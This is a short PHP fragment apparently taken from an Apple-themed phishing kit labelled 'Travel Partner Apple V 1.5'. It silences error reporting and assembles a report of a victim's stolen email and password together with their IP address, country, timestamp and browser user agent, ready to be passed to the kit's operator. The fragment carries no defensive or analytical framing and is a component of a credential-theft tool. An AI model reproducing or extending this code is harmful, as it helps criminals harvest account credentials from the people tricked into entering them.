<?php @error_reporting(0);

$message   = "
++------[ $$ Travel Partner Apple V 1.5 $$ ]------++

	  .++====[ Buah - Apel ]====++.
Email	 :  ".$email."
Password  :  ".$password."
	   .++======[ SNSV ]======++.

	  .++====[ PC Info ]====++.
IP Info   :  ".$ip." | ".$nama_negara." On ".date('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."
	  .++======[ SNSV ]======++.


++------[ $$ Travel Partner Apple V 1.5 $$ ]------++
";

?>